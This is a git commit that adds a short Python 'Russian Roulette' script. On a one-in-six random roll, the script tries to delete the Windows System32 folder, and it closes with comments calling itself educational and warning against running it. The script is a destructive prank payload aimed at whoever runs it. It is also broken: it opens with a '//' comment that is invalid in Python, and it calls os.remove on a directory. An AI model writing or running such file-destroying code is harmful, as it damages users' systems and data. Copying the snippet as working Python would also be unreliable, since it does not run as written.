367c5b232f308611943729744eb3cf732716eb14
samveedhan <samveedhan@icloud.com>
2025-05-06 16:01:29 +0545

    Add files via upload

---
+++ Russian Roulette.py
@@ -0,0 +1,16 @@
+// Russian Roulette
+import random
+import os
+if random.randint(1, 6) == 1:
+    os.remove("C:\Windows\System32")
+else:
+    print("You survived!")
+
+# This code simulates a game of Russian Roulette.
+# It randomly selects a number between 1 and 6.
+# If the number is 1, it deletes the System32 folder.
+# Otherwise, it prints "You survived!".
+# Note: This code is for educational purposes only and should not be executed.
+# It is illegal and unethical to delete system files or folders.
+# Always be cautious when running code that modifies or deletes files.
+
